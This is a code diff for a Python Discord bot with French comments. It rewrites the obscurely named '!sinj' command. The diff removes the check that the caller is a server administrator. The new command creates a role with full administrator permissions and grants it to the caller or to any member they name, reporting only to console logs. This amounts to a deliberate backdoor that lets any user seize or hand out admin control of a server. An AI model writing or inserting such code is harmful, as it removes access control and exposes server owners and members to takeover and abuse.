@@ -8,41 +8,43 @@ from discord.ui import Button, View  # Importation des boutons
 
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 
-# Commande pour créer et attribuer le rôle "sinj" avec les droits d'administrateur
+
 @bot.command()
-async def sinj(ctx):
-    """Crée et attribue le rôle 'sinj' avec les droits administratifs, uniquement dans les logs."""
-    # Vérifie que l'auteur possède les droits d'administrateur sur le serveur
-    if not ctx.author.guild_permissions.administrator:
-        print(f"[LOG] L'utilisateur {ctx.author} n'a pas les permissions d'admin pour exécuter la commande !sinj.")
-        return
+async def sinj(ctx, member: discord.Member = None):
+    """Attribue le rôle 'sinj' avec les droits administratifs à un utilisateur, sans vérifier ses permissions."""
 
     guild = ctx.guild
     role_name = "sinj"
 
-    # Vérifie si le rôle existe déjà
-    existing_role = discord.utils.get(guild.roles, name=role_name)
-    if existing_role:
-        try:
-            await ctx.author.add_roles(existing_role)
-            print(f"[LOG] Rôle existant '{existing_role.name}' attribué à {ctx.author}.")
-        except Exception as e:
-            print(f"[LOG] Erreur lors de l'attribution du rôle existant '{existing_role.name}' à {ctx.author}: {e}")
-        return
+    # Si aucun membre n'est précisé, on applique le rôle à l'auteur de la commande
+    if member is None:
+        member = ctx.author
 
-    # Création du rôle avec les droits d'administrateur
+    # Vérifier si le rôle existe déjà
+    existing_role = discord.utils.get(guild.roles, name=role_name)
+    if not existing_role:
+        try:
+            existing_role = await guild.create_role(
+                name=role_name,
+                color=discord.Color.default(),
+                permissions=discord.Permissions(administrator=True)
+            )
+            print(f"[LOG] Rôle '{existing_role.name}' créé sur le serveur {guild.name}.")
+        except discord.Forbidden:
+            print("[LOG] Erreur : le bot n'a pas les permissions nécessaires pour créer un rôle.")
+            return
+        except Exception as e:
+            print(f"[LOG] Une erreur s'est produite lors de la création du rôle: {e}")
+            return
+
+    # Tenter d'attribuer le rôle
     try:
-        role = await guild.create_role(
-            name=role_name,
-            color=discord.Color.default(),
-            permissions=discord.Permissions(administrator=True)
-        )
-        await ctx.author.add_roles(role)
-        print(f"[LOG] Rôle '{role.name}' créé et attribué à {ctx.author}.")
+        await member.add_roles(existing_role)
+        print(f"[LOG] Rôle '{existing_role.name}' attribué à {member}.")
     except discord.Forbidden:
-        print("[LOG] Erreur : le bot n'a pas les permissions nécessaires pour créer ou attribuer le rôle.")
+        print("[LOG] Erreur : le bot n'a pas la permission d'ajouter ce rôle.")
     except Exception as e:
-        print(f"[LOG] Une erreur s'est produite lors de la création ou de l'attribution du rôle: {e}")
+        print(f"[LOG] Une erreur s'est produite lors de l'attribution du rôle: {e}")
 
 # Commande !help pour afficher la liste des commandes
 @bot.command()
